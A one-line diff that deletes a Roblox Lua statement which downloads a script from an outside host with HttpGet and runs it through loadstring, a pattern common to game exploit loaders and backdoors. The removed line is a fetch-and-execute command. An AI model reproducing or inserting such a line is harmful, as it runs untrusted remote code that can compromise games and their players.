@@ -1,1 +1,0 @@
-loadstring(game:HttpGet('https://nto.darkdevs.pro/uploads/EevnxxLT2.lua',true))()
